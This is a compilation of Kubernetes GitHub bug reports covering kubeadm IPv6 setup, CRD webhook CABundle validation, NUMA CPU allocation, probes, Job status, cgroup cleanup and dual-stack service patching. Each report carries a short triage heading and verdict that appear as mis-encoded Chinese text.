#### What did you expect to happen?

Once `kubeadm init` had completed, installation of a network option should proceed and complete normally; it (and other pods) should be able to access the _kubernetes_ service.


#### How can we reproduce it (as minimally and precisely as possible)?

Rather than repeat the details of every command:

Take a vanilla, minimal Debian 12.5 installation, add containerd as the runtime, and then `kubeadm init`. Specifically, I use the cluster configuration file:

```
---
apiVersion: kubeadm.k8s.io/v1beta3
kind: InitConfiguration

localAPIEndpoint:
  advertiseAddress: fdc9:b01a:9d26:0:8aae:ddff:fe0a:99d8

nodeRegistration:
  taints: []

---
apiVersion: kubeadm.k8s.io/v1beta3
kind: ClusterConfiguration
kubernetesVersion: 1.29.2

clusterName: harmony

apiServer:
  certSANs:
    - "princess-celestia.arkane-systems.lan"
    - "172.16.0.129"
  timeoutForControlPlane: 4m0s

etcd:
  local:
    dataDir: /var/lib/etcd

networking:
  dnsDomain: cluster.local
  serviceSubnet: fdc9:b01a:cafe:60::/112,10.96.0.0/16
  podSubnet: fdc9:b01a:cafe:f4::/56,10.244.0.0/16
```

to set up for IPv6 networking, using the command `kubeadm init --config ./cluster.conf`, although using different subnet configurations makes no difference.


#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.29.2
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.29.2
```

</details>


#### Cloud provider

<details>
None.
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
PRETTY_NAME="Debian GNU/Linux 12 (bookworm)"
NAME="Debian GNU/Linux"
VERSION_ID="12"
VERSION="12 (bookworm)"
VERSION_CODENAME=bookworm
ID=debian
HOME_URL="https://www.debian.org/"
SUPPORT_URL="https://www.debian.org/support"
BUG_REPORT_URL="https://bugs.debian.org/"
$ uname -a
Linux princess-celestia 6.1.0-18-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.76-1 (2024-02-01) x86_64 GNU/Linux

```

</details>


#### Install tools

<details>
None except `kubeadm`.
</details>


#### Container runtime (CRI) and version (if applicable)

<details>
# containerd --version
containerd containerd.io 1.6.28 ae07eda36dd25f8a1b98dfbf587313b99c0190bb
</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

ä¸æ¶‰åŠ

---

## Issue #123835 CRD validation allows invalid CABundles that will fail setting up handlers

- Issue é“¾æ¥ï¼š[#123835](https://github.com/kubernetes/kubernetes/issues/123835)

### Issue å†…å®¹

#### What happened?

A CRDs with an invalid conversion webhook CABundle failed to serve requests not requiring conversion.


#### What did you expect to happen?

Since creating cr-1.yaml doesn't require conversion, I would have expected either:

1. An error response when attempting to create/update the CRD with an invalid CABundle
2. Only an error when conversion is required to server a request

#### How can we reproduce it (as minimally and precisely as possible)?


Create a mult-version CRD with a conversion webhook configured with an invalid CABundle:

```yaml
apiVersion: apiextensions.k8s.io/v1
kind: CustomResourceDefinition
metadata:
  name: replicant.stable.example.com
spec:
  group: stable.example.com
  versions:
    - name: v1
      served: true
      storage: true
      schema:
        openAPIV3Schema:
          type: object
          properties:
            spec:
              type: object
              properties:
                myfield:
                  type: integer
    - name: v2
      served: true
      storage: false
      schema:
        openAPIV3Schema:
          type: object
          properties:
            spec:
              type: object
              properties:
                myfield:
                  type: integer
  scope: Namespaced
  names:
    plural: replicant
    singular: replicants
    kind: Replicant
  conversion:
    strategy: Webhook
    webhook:
      conversionReviewVersions: [v1]
      clientConfig:
        service:
          namespace: default
          name: example-conversion-webhook-server
          path: /convert
        caBundle: "Cg=="
```

```
$ kubectl apply -f crd.yaml
customresourcedefinition.apiextensions.k8s.io/replicant.stable.example.com created
```

Read the CRD back:

```
$ kubectl get crd replicant.stable.example.com -oyaml
apiVersion: apiextensions.k8s.io/v1
kind: CustomResourceDefinition
...
```

Attempt to create a CR using the storage version:

```yaml
apiVersion: stable.example.com/v1
kind: Replicant
metadata:
  name: cr1
spec:
  myfield: 1
```

```
$ kubectl apply cr1.yaml
Error from server (InternalError): error when retrieving current configuration of:
Resource: "stable.example.com/v1, Resource=replicant", GroupVersionKind: "stable.example.com/v1, Kind=Replicant"
Name: "cr1", Namespace: "default"
from server for: "cr-1.yaml": Internal error occurred: error resolving resource

$ grep "customresource_handler" /tmp/local-kube-apiserver.log
E0308 12:57:41.892888 1158130 customresource_handler.go:301] unable to load root certificates: unable to parse bytes as PEM block

```

#### Anything else we need to know?

_No response_

#### Kubernetes version

All babsically. master...{introduction of CRD conversion}




#### Cloud provider

All

#### OS version

All

#### Install tools

_No response_

#### Container runtime (CRI) and version (if applicable)

_No response_

#### Related plugins (CNI, CSI, ...) and versions (if applicable)

_No response_

### åˆ†æç»“æœ

ä¸æ¶‰åŠ

---

## Issue #123832 [apisnoop-conformance-gate][conformance] ValidatingAdmissionPolicy - You have 17 untested endpoints

- Issue é“¾æ¥ï¼š[#123832](https://github.com/kubernetes/kubernetes/issues/123832)

### Issue å†…å®¹

from: https://testgrid.k8s.io/sig-arch-conformance#apisnoop-conformance-gate&width=20

<img width="902" alt="image" src="https://github.com/kubernetes/kubernetes/assets/23304/1a304e9d-8a7c-4d42-a759-1eceab341471">

from: https://storage.googleapis.com/kubernetes-jenkins/logs/apisnoop-conformance-gate/1765238577685336064/build-log.txt
```
==================
UNTESTED ENDPOINTS
listAdmissionregistrationV1ValidatingAdmissionPolicyBinding
patchAdmissionregistrationV1ValidatingAdmissionPolicyStatus
patchAdmissionregistrationV1ValidatingAdmissionPolicy
patchAdmissionregistrationV1ValidatingAdmissionPolicyBinding
createAdmissionregistrationV1ValidatingAdmissionPolicyBinding
replaceAdmissionregistrationV1ValidatingAdmissionPolicy
deleteAdmissionregistrationV1CollectionValidatingAdmissionPolicy
deleteAdmissionregistrationV1CollectionValidatingAdmissionPolicyBinding
deleteAdmissionregistrationV1ValidatingAdmissionPolicy
deleteAdmissionregistrationV1ValidatingAdmissionPolicyBinding
readAdmissionregistrationV1ValidatingAdmissionPolicyStatus
replaceAdmissionregistrationV1ValidatingAdmissionPolicyStatus
readAdmissionregistrationV1ValidatingAdmissionPolicyBinding
replaceAdmissionregistrationV1ValidatingAdmissionPolicyBinding
readAdmissionregistrationV1ValidatingAdmissionPolicy
listAdmissionregistrationV1ValidatingAdmissionPolicy
createAdmissionregistrationV1ValidatingAdmissionPolicy

==================
You have 17 untested endpoints
==================
```


### åˆ†æç»“æœ

ä¸æ¶‰åŠã€‚

---

## Issue #123816 Pod Failed with TopologyAffinityError because of init-container CPU NUMA Topology BUG

- Issue é“¾æ¥ï¼š[#123816](https://github.com/kubernetes/kubernetes/issues/123816)

### Issue å†…å®¹

#### What happened?

My Node is 250Gi memory and 64 Core CPU, which has two NUMA node, both is 125Gi and 32 Core CPU, topology policy is single-numa-node.
Create 2 pod,  with init-container 1 Core CPU and 1Gi memory, app container 26 Core and 32Gi memory.
The first pod create success.
The second pod will failed with TopologyAffinityError.

Result from `lscpu`:
```
NUMA node0 CPU(s):     0-15,32-47
NUMA node1 CPU(s):     16-31,48-63
```

In `/var/lib/kubelet/cpu_manager_state` file: 
```
{
  "policyName": "static",
  "defaultCpuSet": "1,3,15-31,47-63",
  "entries": {
    "69aa6124-4e0e-4c66-94ea-feae7df25b68": {  # the second Pod, init-container use NUMA 0
      "init-container": "35"
    },
    "e49ac32c-22a3-4c8c-8be3-721bd1fd9eaa": {   # the first Pod, use NUMA 0
      "centos": "0,2,4-14,32,34,36-46",
      "init-container": "33"
    }
  },
  "checksum": 3748757820
}
```



#### What did you expect to happen?

Both two pods can be created successfully.
First pod use NUMA 0;
The sceond pod init-container can use either NUMA 0 or NUMA 1, but app container use NUMA 1;

#### How can we reproduce it (as minimally and precisely as possible)?

1. Create one pod, which use CPU, for example 10 of 32(Numa Node) CPU of the node
2. Create another pod, which need init-container 1Core CPU, and app container need most of NUMA Node CPU,  like 25 Core (greater than the left of the first NUMA)
3.  The second pod will failed with TopologyAffinityError.

#### Anything else we need to know?

I think the bug is in `generateCPUTopologyHints ` function:  https://github.com/kubernetes/kubernetes/blob/7ea3d0245a63fbbba698f1cb939831fe8143db3e/pkg/kubelet/cm/cpumanager/policy_static.go#L623 
1. when allocate init-container CPU, CPUManager will record as cpuToReuse for pod. https://github.com/kubernetes/kubernetes/blob/7ea3d0245a63fbbba698f1cb939831fe8143db3e/pkg/kubelet/cm/cpumanager/policy_static.go#L345  
2. before call `generateCPUTopologyHints`, get cpuToReuse of the pod, as reusable https://github.com/kubernetes/kubernetes/blob/7ea3d0245a63fbbba698f1cb939831fe8143db3e/pkg/kubelet/cm/cpumanager/policy_static.go#L587
3. when caculate app container CPU, CPUManager will filter the NUMA Node which is not equal to reusableCPU's NUMA Node
4. Even if NUMA 1 is the only one that fits CPU resource acquirement, it still passed in calculating TopologyHint; NUMA 0 fits with reusableCPU, but CPU left is not enough. 

#### Kubernetes version

<details>

```console
Client Version: version.Info{Major:"1", Minor:"22", GitVersion:"v1.22.17", GitCommit:"a7736eaf34d823d7652415337ac0ad06db9167fc", GitTreeState:"clean", BuildDate:"2022-12-08T11:47:36Z", GoVersion:"go1.16.15", Compiler:"gc", Platform:"linux/amd64"}
Server Version: version.Info{Major:"1", Minor:"22", GitVersion:"v1.22.17", GitCommit:"a7736eaf34d823d7652415337ac0ad06db9167fc", GitTreeState:"clean", BuildDate:"2022-12-08T11:42:04Z", GoVersion:"go1.16.15", Compiler:"gc", Platform:"linux/amd64"}
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

ä¸æ¶‰åŠ

---

## Issue #123787  conn.go:254] Error on socket receive: read tcp 127.0.0.1:33421->127.0.0.1:54136: use of closed network connection

- Issue é“¾æ¥ï¼š[#123787](https://github.com/kubernetes/kubernetes/issues/123787)

### Issue å†…å®¹

#### What happened?

I used the jenkins k8s plugin to dynamically schedule the pod .This error occurred when the pod was connected to execute the command after successful scheduling

#### What did you expect to happen?

Why is socket closed before to connecting? 

#### How can we reproduce it (as minimally and precisely as possible)?

Jenkins ERROR: 
[2024-03-06T13:20:56.162Z]  java.net.SocketTimeoutException: connect timed out

K8s node  /var/log/message  ERROR:
Mar  6 21:18:56 k8s-node-11 kubelet: E0306 21:18:56.398023  214481 conn.go:254] Error on socket receive: read tcp 127.0.0.1:33421->127.0.0.1:54136: use of closed network connectionï¼š

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
Client Version: version.Info{Major:"1", Minor:"19+", GitVersion:"v1.19.3-1+db95af67a8a660", GitCommit:"db95af67a8a660dc53ac09b8475161de2f5c711e", GitTreeState:"clean", BuildDate:"2021-01-22T07:54:01Z", GoVersion:"go1.15.3", Compiler:"gc", Platform:"linux/amd64"}
Server Version: version.Info{Major:"1", Minor:"19+", GitVersion:"v1.19.3-1+db95af67a8a660", GitCommit:"db95af67a8a660dc53ac09b8475161de2f5c711e", GitTreeState:"clean", BuildDate:"2021-01-22T07:24:32Z", GoVersion:"go1.15.2", Compiler:"gc", Platform:"linux/amd64"}
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
NAME="CentOS Linux"
VERSION="7 (Core)"
ID="centos"
ID_LIKE="rhel fedora"
VERSION_ID="7"
PRETTY_NAME="CentOS Linux 7 (Core)"
ANSI_COLOR="0;31"
CPE_NAME="cpe:/o:centos:centos:7"
HOME_URL="https://www.centos.org/"
BUG_REPORT_URL="https://bugs.centos.org/"

CENTOS_MANTISBT_PROJECT="CentOS-7"
CENTOS_MANTISBT_PROJECT_VERSION="7"
REDHAT_SUPPORT_PRODUCT="centos"
REDHAT_SUPPORT_PRODUCT_VERSION="7"
# paste output here
$ uname -a
# paste output here
Linux cambricon-test-ai74 3.10.0-957.el7.x86_64 #1 SMP Thu Nov 8 23:39:32 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>
kubeadmin
</details>


#### Container runtime (CRI) and version (if applicable)

<details>
docker  Version: 20.10.12
</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>
calico v3.8.4
</details>


### åˆ†æç»“æœ

ä¸æ¶‰åŠ

---

## Issue #123784 client-go: reflector name defaulting seems broken by Go modules

- Issue é“¾æ¥ï¼š[#123784](https://github.com/kubernetes/kubernetes/issues/123784)

### Issue å†…å®¹

#### What happened?

Client-go emits logs like
```
Listing and watching *v1.Namespace from pkg/mod/k8s.io/client-go@v0.29.2/tools/cache/reflector.go:229
```


#### What did you expect to happen?

Log says "from <somewhere more useful>"

#### How can we reproduce it (as minimally and precisely as possible)?

Increase verbosity of anything using client-go, check logs

#### Anything else we need to know?

Code is from https://github.com/kubernetes/kubernetes/blame/05cb0a55c88e0cdcfe2fb184328ad9be53e94d5c/staging/src/k8s.io/client-go/tools/cache/reflector.go#L290. `client-go/tools/cache/` is no longer accurate, with go modules this will actually be something like `client-go@v0.29.1/tools/cache/` generally. The blame shows its 6 years old which was before go modules, which would make sense.

This also means this has probably been an issue for many years, and it only impacts logs that are generally disabled, so this is certainly not a high priority

#### Kubernetes version

<details>

```console
N/A
```

</details>


#### Cloud provider

<details>

</details>
N/A

#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

ä¸æ¶‰åŠ

---

## Issue #123778 kublet prober infinite Readiness check - no Liveness probe defeating self-heal 

- Issue é“¾æ¥ï¼š[#123778](https://github.com/kubernetes/kubernetes/issues/123778)

### Issue å†…å®¹

#### What happened?

pod(container) Readiness and Liveness probe are non-blocking routines. And if readiness probe is failing, a liveness probe can trigger restart and possibly self-heal.

However, encountered a case where;
- coredns pod starts, but an external automation causes IP removal on node. the cni IPAM is forced to sync the resource state and the coredns pod network ns is torn down and rebuilt - container ID change, but pod remains ID unchanged
```
Feb 28 16:33:53 ... kubelet.go:2456] "SyncLoop (PLEG): event for pod" pod="kube-system/coredns-f88c6698d-zmjgk" event={"ID":"001d42a0-1729-44fc-9959-b6e751ee44d9","Type":"ContainerStarted","Data":"9e324b5e26ac15640355f3dd86bcdb80f81f380827b435abc85365cd67fcc1f2"}
Feb 28 16:33:54 ... kubelet.go:2456] "SyncLoop (PLEG): event for pod" pod="kube-system/coredns-f88c6698d-zmjgk" event={"ID":"001d42a0-1729-44fc-9959-b6e751ee44d9","Type":"ContainerStarted","Data":"86d1a5bcff3978fcbaae12fc6259adade96747cc14c3aa3374102d41b34c1636"}
```

-  no startUp probe in coredns, so container ready, and doProbe readiness probe is sent
```
Feb 28 16:33:54 ... kubelet.go:2528] "SyncLoop (probe)" probe="readiness" status="" pod="kube-system/coredns-f88c6698d-zmjgk"
```

- this http probe fails with a http status code 503, aand a liveness probe is never issued and self-heal/restart triggered
```
Feb 28 16:33:54 ... prober.go:107] "Probe failed" probeType="Readiness" pod="kube-system/coredns-f88c6698d-zmjgk" podUID="001d42a0-1729-44fc-9959-b6e751ee44d9" containerName="coredns" probeResult="failure" output="HTTP probe failed with statuscode: 503"
Feb 28 16:33:56 ... prober.go:107] "Probe failed" probeType="Readiness" pod="kube-system/coredns-f88c6698d-zmjgk" podUID="001d42a0-1729-44fc-9959-b6e751ee44d9" containerName="coredns" probeResult="failure" output="HTTP probe failed with statuscode: 503"
Feb 29 00:18:22 ... prober.go:107] "Probe failed" probeType="Readiness" pod="kube-system/coredns-f88c6698d-zmjgk" podUID="001d42a0-1729-44fc-9959-b6e751ee44d9" containerName="coredns" probeResult="failure" output="HTTP probe failed with statuscode: 503"
```
---
- It is just unclear why the liveness probe on coredns spec is never sent
is the getWorker here to [UpdatePodStatus](https://github.com/kubernetes/kubernetes/blob/546f7c30860dcdecb75c544230a1b7cdf5bd5958/pkg/kubelet/prober/prober_manager.go#L289) after checking startup probe not introducing an inadvertent wait for readiness?

#### What did you expect to happen?

- kubernetes self-heal attempt of a pod that is stuck/failing probe

#### How can we reproduce it (as minimally and precisely as possible)?

```
apiVersion: v1
kind: Pod
metadata:
  labels:
    test: liveness
  name: liveness-http
spec:
  containers:
  - name: liveness
    image: registry.k8s.io/liveness
    args:
    - /server
    livenessProbe:
      failureThreshold: 5
      httpGet:
        path: /healthz
        port: 8080
        httpHeaders:
        - name: Custom-Header
          value: Awesome
      initialDelaySeconds: 60 || 300
      periodSeconds: 10
      successThreshold: 1
      timeoutSeconds: 5
    readinessProbe:
      failureThreshold: 3
      httpGet:
        path: /healthz
        port: 8080
        httpHeaders:
        - name: Custom-Header
          value: Awesome
      periodSeconds: 10
      successThreshold: 1
      timeoutSeconds: 1
  restartPolicy: Always
```
- test pod above
- remove the IP assigned to a pod externally, after starting and readiness probe(unimportant), but before the liveness probe 
- forcing the node IPAM to re-sync and a similar error is encountered;
```
Mar 06 20:18:37 ... prober.go:107] "Probe failed" probeType="Readiness" pod="gateway-ns/liveness-http" podUID=868de996-ff69-44bd-b73c-feaeb2234839 containerName="liveness" probeResult=failure output="HTTP probe failed with statuscode: 500"
Mar 06 20:18:47 ... prober.go:107] "Probe failed" probeType="Readiness" pod="gateway-ns/liveness-http" podUID=868de996-ff69-44bd-b73c-feaeb2234839 containerName="liveness" probeResult=failure output="HTTP probe failed with statuscode: 500"
Mar 06 20:18:57 ... prober.go:107] "Probe failed" probeType="Readiness" pod="gateway-ns/liveness-http" podUID=868de996-ff69-44bd-b73c-feaeb2234839 containerName="liveness" probeResult=failure output="HTTP probe failed with statuscode: 500"
Mar 06 20:19:07 ... prober.go:107] "Probe failed" probeType="Readiness" pod="gateway-ns/liveness-http" podUID=868de996-ff69-44bd-b73c-feaeb2234839 containerName="liveness" probeResult=failure output="HTTP probe failed with statuscode: 500"
```

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.29.1
Kustomize Version: v5.0.4...
Server Version: v1.29.1...-eks-...
```

</details>


#### Cloud provider

<details>
EKS
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
NAME="Amazon Linux"
VERSION="2"
ID="amzn"
ID_LIKE="centos rhel fedora"
VERSION_ID="2"
PRETTY_NAME="Amazon Linux 2"
ANSI_COLOR="0;33"
CPE_NAME="cpe:2.3:o:amazon:amazon_linux:2"
HOME_URL="https://amazonlinux.com/"

$ uname -a
inux ....compute.internal 5.10.198-187.748.amzn2.x86_64 #1 SMP Tue Oct 24 19:49:54 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

ä¸æ¶‰åŠ

---

## Issue #123775 A Job might finish with ready!=0, terminating!=0

- Issue é“¾æ¥ï¼š[#123775](https://github.com/kubernetes/kubernetes/issues/123775)

### Issue å†…å®¹

#### What happened?

When a Job is declared Failed, the running Pods still count as ready.
This causes problems for higher level controllers that use the Failed/Completed conditions to do usage accounting. If the job is marked as finished before all the pods finish, the accounting is inaccurate.

#### What did you expect to happen?

A few options (non-necessarily exclusive), in order of my preference:
1. The job not to be declared Completed/Failed until all the Pods have finished. This is possibly a breaking change. As a mitigation, we can use the `FailureTarget` or `SuccessCriteriaMet` conditions to provide early feedback to controllers that a Job is marked for failure.
2. ~Do not count Pods with a deletionTimestamp as ready. (Possibly a breaking change)~
3. ~We just consider ready=0 if setting a finished condition~
4. Continue syncing a Job even after the Failed condition is added, until ready/terminating fields are zero.

Options 2 and 3 don't satisfy the requirement of proper accounting.

#### How can we reproduce it (as minimally and precisely as possible)?

1. Use this Job (note backoffLimit: 0):
```yaml
apiVersion: batch/v1
kind: Job
metadata:
  name: indexed-job
  labels:
    jobgroup: indexedjob
spec:
  completions: 4
  parallelism: 4
  backoffLimit: 0
  completionMode: Indexed
  podReplacementPolicy: Failed
  template:
    metadata:
      labels:
        jobgroup: indexedjob
    spec:
      restartPolicy: Never
      containers:
      - name: 'worker'
        image: 'centos:7'
        command:
        - "sh"
        - "-c"
        - "echo 'hello' && sleep 120 && echo 'bye'
```
2. Delete one of the pods with kubectl

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```
ANY
</details>


#### Cloud provider

<details>
ANY
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

ä¸æ¶‰åŠã€‚

---

## Issue #123766 failed to delete cgroup paths

- Issue é“¾æ¥ï¼š[#123766](https://github.com/kubernetes/kubernetes/issues/123766)

### Issue å†…å®¹

#### What happened?

Pods stuck in terminating state

lots of log entries like this one
```
journalctl -u kubelet --since -1m -f | grep "failed to delete cgroup paths"
Feb 28 05:57:26 worker kubelet[592400]: E0228 05:57:26.352096  592400 pod_workers.go:1300] "Error syncing pod, skipping" err="failed to delete cgroup paths for [kubepods burstable podc5659845-8967-408a-aa34-1223384f0ade] : unable to destroy cgroup paths for cgroup [kubepods burstable podc5659845-8967-408a-aa34-1223384f0ade] : Failed to remove paths: map[:/sys/fs/cgroup/unified/kubepods.slice/kubepods-burstable.slice/kubepods-burstable-podc5659845_8967_408a_aa34_1223384f0ade.slice blkio:/sys/fs/cgroup/blkio/kubepods.slice/kubepods-burstable.slice/kubepods-burstable-podc5659845_8967_408a_aa34_1223384f0ade.slice cpu:/sys/fs/cgroup/cpu,cpuacct/kubepods.slice/kubepods-burstable.slice/kubepods-burstable-podc5659845_8967_408a_aa34_1223384f0ade.slice cpuacct:/sys/fs/cgroup/cpu,cpuacct/kubepods.slice/kubepods-burstable.slice/kubepods-burstable-podc5659845_8967_408a_aa34_1223384f0ade.slice cpuset:/sys/fs/cgroup/cpuset/kubepods.slice/kubepods-burstable.slice/kubepods-burstable-podc5659845_8967_408a_aa34_1223384f0ade.slice devices:/sys/fs/cgroup/devices/kubepods.slice/kubepods-burstable.slice/kubepods-burstable-podc5659845_8967_408a_aa34_1223384f0ade.slice freezer:/sys/fs/cgroup/freezer/kubepods.slice/kubepods-burstable.slice/kubepods-burstable-podc5659845_8967_408a_aa34_1223384f0ade.slice hugetlb:/sys/fs/cgroup/hugetlb/kubepods.slice/kubepods-burstable.slice/kubepods-burstable-podc5659845_8967_408a_aa34_1223384f0ade.slice memory:/sys/fs/cgroup/memory/kubepods.slice/kubepods-burstable.slice/kubepods-burstable-podc5659845_8967_408a_aa34_1223384f0ade.slice misc:/sys/fs/cgroup/misc/kubepods.slice/kubepods-burstable.slice/kubepods-burstable-podc5659845_8967_408a_aa34_1223384f0ade.slice name=systemd:/sys/fs/cgroup/systemd/kubepods.slice/kubepods-burstable.slice/kubepods-burstable-podc5659845_8967_408a_aa34_1223384f0ade.slice net_cls:/sys/fs/cgroup/net_cls,net_prio/kubepods.slice/kubepods-burstable.slice/kubepods-burstable-podc5659845_8967_408a_aa34_1223384f0ade.slice net_prio:/sys/fs/cgroup/net_cls,net_prio/kubepods.slice/kubepods-burstable.slice/kubepods-burstable-podc5659845_8967_408a_aa34_1223384f0ade.slice perf_event:/sys/fs/cgroup/perf_event/kubepods.slice/kubepods-burstable.slice/kubepods-burstable-podc5659845_8967_408a_aa34_1223384f0ade.slice pids:/sys/fs/cgroup/pids/kubepods.slice/kubepods-burstable.slice/kubepods-burstable-podc5659845_8967_408a_aa34_1223384f0ade.slice rdma:/sys/fs/cgroup/rdma/kubepods.slice/kubepods-burstable.slice/kubepods-burstable-podc5659845_8967_408a_aa34_1223384f0ade.slice]" pod="nams-prod-de/attachment-upload-service-cb986ddbc-zz85t" podUID="c5659845-8967-408a-aa34-1223384f0ade"
```

#### What did you expect to happen?

Pods terminating and cgroups paths deleted

#### How can we reproduce it (as minimally and precisely as possible)?

Not sure. In one cluster I have seen the issue multiple times. Other clusters with the same configuration do not show the same symptoms. 

#### Anything else we need to know?

Unable to delete cgroup scope
```
rmdir /sys/fs/cgroup/unified/kubepods.slice/kubepods-burstable.slice/kubepods-burstable-podc5659845_8967_408a_aa34_1223384f0ade.slice/cri-containerd-1495ffbe17ae4d061ef354162d59a10fa7536e6512f8d280ceb1a21fa31fe684.scope
rmdir: failed to remove '/sys/fs/cgroup/unified/kubepods.slice/kubepods-burstable.slice/kubepods-burstable-podc5659845_8967_408a_aa34_1223384f0ade.slice/cri-containerd-1495ffbe17ae4d061ef354162d59a10fa7536e6512f8d280ceb1a21fa31fe684.scope': Device or resource busy
```

Workaround
```
apt install cgroup-tools
lscgroup | grep <part-of-pod-id>
for cgroup in $(lscgroup | grep <part-of-pod-id>); do cgdelete -r $cgroup; done
```

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: version.Info{Major:"1", Minor:"26", GitVersion:"v1.26.10", GitCommit:"b8609d4dd75c5d6fba4a5eaa63a5507cb39a6e99", GitTreeState:"clean", BuildDate:"2023-10-18T11:44:31Z", GoVersion:"go1.20.10", Compiler:"gc", Platform:"linux/amd64"}
Kustomize Version: v4.5.7
Server Version: version.Info{Major:"1", Minor:"28", GitVersion:"v1.28.5", GitCommit:"506050d61cf291218dfbd41ac93913945c9aa0da", GitTreeState:"clean", BuildDate:"2023-12-19T13:32:53Z", GoVersion:"go1.20.12", Compiler:"gc", Platform:"linux/amd64"}
```

</details>


#### Cloud provider

<details>
none, kubeadm based cluster on VMware VMs
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
NAME="Ubuntu"
VERSION="20.04.6 LTS (Focal Fossa)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 20.04.6 LTS"
VERSION_ID="20.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=focal
UBUNTU_CODENAME=focal

$ uname -a
Linux gtloclvu14373 5.15.0-94-generic #104~20.04.1-Ubuntu SMP Tue Jan 16 13:34:09 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
```

</details>


#### Install tools

<details>
Kubermatic Kubernetes Platform v2.24
</details>


#### Container runtime (CRI) and version (if applicable)

<details>
containerd containerd.io 1.6.28 ae07eda36dd25f8a1b98dfbf587313b99c0190bb

runc version 1.1.12
commit: v1.1.12-0-g51d5e94
spec: 1.0.2-dev
go: go1.20.13
libseccomp: 2.5.1
</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>
Canal v3.26.1
</details>


### åˆ†æç»“æœ

ä¸æ¶‰åŠ

---

## Issue #123761 patching a service with the same value ipFamilyPolicy: "RequireDualStack" causes an error

- Issue é“¾æ¥ï¼š[#123761](https://github.com/kubernetes/kubernetes/issues/123761)

### Issue å†…å®¹

#### What happened?

1. Used the [ingress-nginx](https://github.com/kubernetes/ingress-nginx) helm chart to deploy a dual stack ingress.
2. Ran helm upgrade --install with the exact same values again to gain idempotancy
3. Got an error that describes, that ipFamilyPolicy cannot be patched, even though the same value "RequireDualStack" was used.
4. Created a [bug](https://github.com/kubernetes/ingress-nginx/issues/11068) on ingress-nginx because I initially thought this was an issue with the helm-chart
5. The folks over there were kind enough to route me here with a more comprehensive point to look at: https://github.com/kubernetes/kubernetes/blob/dc3f5ec6ccb9855dfa99f4c1078625df5fdfab6a/pkg/registry/core/service/storage/alloc.go#L184

#### What did you expect to happen?

A patch with the same value in the service will not result in an error.

#### How can we reproduce it (as minimally and precisely as possible)?

```sh
helm repo add ingress-nginx https://kubernetes.github.io/ingress-nginx
helm repo update

# 1st installation on a fresh cluster, no issues
helm upgrade --install ingress-nginx ingress-nginx/ingress-nginx --namespace ingress-nginx --create-namespace --reuse-values --set resources=null --set controller.service.ipFamilyPolicy=RequireDualStack --wait

# 2nd try, same cluster, this time the error happens
helm upgrade --install ingress-nginx ingress-nginx/ingress-nginx --namespace ingress-nginx --create-namespace --reuse-values --set resources=null --set controller.service.ipFamilyPolicy=RequireDualStack --wait
```

#### Anything else we need to know?

Independent of cloudprovider or used loadbalancers, this issue comes directly from kubernetes itself.

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.29.2
Server Version: v1.28.2
```

</details>


#### Cloud provider

<details>
Doesn't matter
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
PRETTY_NAME="Ubuntu 22.04.3 LTS"
NAME="Ubuntu"
VERSION_ID="22.04"
VERSION="22.04.3 LTS (Jammy Jellyfish)"
VERSION_CODENAME=jammy
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
